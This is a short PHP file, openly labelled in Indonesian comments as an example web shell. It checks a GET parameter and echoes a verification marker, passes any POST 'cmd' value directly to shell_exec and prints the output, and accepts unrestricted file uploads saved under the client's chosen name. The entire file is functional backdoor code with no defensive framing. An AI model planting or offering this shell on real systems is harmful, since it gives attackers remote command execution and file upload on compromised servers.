<?php
// Web Shell - contoh kemungkinan isi

// 1. Check untuk verifikasi
if (isset($_GET['nm']) && $_GET['nm'] == 'nomi') {
    echo "NowMeee"; // Marker untuk verifikasi
    exit;
}

// 2. Fungsi eksekusi command
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

// 3. Upload file
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded!";
}
